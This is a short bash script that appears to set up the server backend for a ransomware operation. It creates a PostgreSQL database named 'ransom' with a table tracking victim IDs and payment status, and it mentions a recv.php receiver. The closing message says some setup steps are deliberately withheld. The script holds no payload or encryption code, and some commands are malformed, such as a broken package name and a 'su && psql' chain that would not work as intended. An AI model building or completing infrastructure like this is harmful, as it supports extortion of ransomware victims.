#!/bin/bash
echo "[+]Installing important stuff"
apt-get install php7.4.-pgsql


echo "[+]Setting up psql server"
su - postgres && psql -c "CREATE DATABASE ransom;"
su - postgres && psql -c "\c ransom; create TABLE Ransomware_Details(\
	sr NUMERIC UNIQUE NOT NULL,\
	id VARCHAR(10) UNIQUE NOT NULL,\
	payment_status VARCHAR(5) NOT NULL
	);"

echo "[!]Change the config file pg_hba.conf and set auth method to md5 for postgres user\nChange the password of postgres to admin (Not Recommended) or change the postgress password in recv.php file\nThere are some hidden changes that has to be done. I am not going to mention them to avoid misuse by script kiddes. Identify and then set up yourself and make it ready!";
